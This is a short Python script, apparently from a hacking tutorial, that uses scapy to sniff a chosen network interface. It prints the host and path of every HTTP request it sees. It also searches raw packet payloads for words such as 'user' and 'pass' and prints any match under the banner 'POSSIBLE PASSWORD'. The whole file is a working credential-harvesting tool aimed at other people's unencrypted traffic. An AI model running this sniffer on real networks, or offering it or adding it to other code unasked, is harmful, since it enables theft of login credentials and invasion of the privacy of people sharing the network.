import scapy.all
from scapy.layers import http
import argparse


def sniffer(interface):
	"""This will uses the scapy.all.sniff function"""
	scapy.all.sniff(iface= interface, store= False, prn=processed_pkt )

def get_interface():
	"""This will take the interface"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--iface', help= 'Interface to sniff')
	args = parser.parse_args()
	return args.iface


def processed_pkt(pkt):
	"""This will filter and print the packets"""
	if pkt.haslayer(http.HTTPRequest):
		print(f'{pkt[http.HTTPRequest].Host}{pkt[http.HTTPRequest].Path}')
		if pkt.haslayer(scapy.all.Raw):
			load = pkt[scapy.all.Raw].load
			key_word = ['user', 'pass', 'login', 'submit']
			for ele in key_word:	
				if ele in str(load):
					char = '*'
					print(f'{char*20}POSSIBLE PASSWORD{char*20}\n\n{load}\n\n{char*57}')
					break


iface = get_interface()
print('[*]sniffing')
sniffer(iface)	